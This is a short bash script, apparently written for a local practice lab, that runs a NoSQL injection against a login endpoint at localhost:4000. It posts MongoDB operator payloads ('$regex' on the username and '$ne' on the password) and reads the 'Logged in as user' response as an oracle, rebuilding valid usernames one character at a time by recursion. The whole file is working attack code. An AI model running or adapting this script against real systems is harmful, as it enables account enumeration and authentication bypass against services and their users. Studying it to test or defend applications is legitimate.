 #!/bin/bash

# Functions
function ctrl_c() {
  echo -e "\n[!] Saliendo..."
  tput cnorm
  exit 1
}

function MakeReq() {
  username="^$1.*"
  req_first_part='{"username":{"$regex":"'
  req_second_part='"},"password":{"$ne":"admin"}}'
  full_req="${req_first_part}$username${req_second_part}"
  response=$(curl -X POST -H 'Content-Type: application/json' -s -d "$full_req" "$url" | grep "Logged in as user")
  echo $response
}

function RecursiveUserFuzz() {
  local partial_password="$1"
  local found_any=false
  for letter in {a..z} {A..Z} {0..9}; do
    local new_pass="${partial_password}${letter}"
    local response="$(MakeReq "$new_pass")"
    if ! [[ -z "$response" ]]; then
      found_any=true
      RecursiveUserFuzz "$new_pass"
    fi 
  done
  if [[ "$found_any" == false ]]; then
    echo -e "\n[+] Found user: $partial_password"
  fi
}

# Ctrl + C 
trap ctrl_c SIGINT

url="http://localhost:4000/user/login"
echo -e -n "\n-----------------------------------------------------------------------------------------------------"
echo -e "\n[+] Fuzzing users in $url using a no SQL inyection"
echo -e "-----------------------------------------------------------------------------------------------------\n\n"
tput civis
RecursiveUserFuzz ""

echo -e "\n[+] Search succesfully completed\n"

tput cnorm
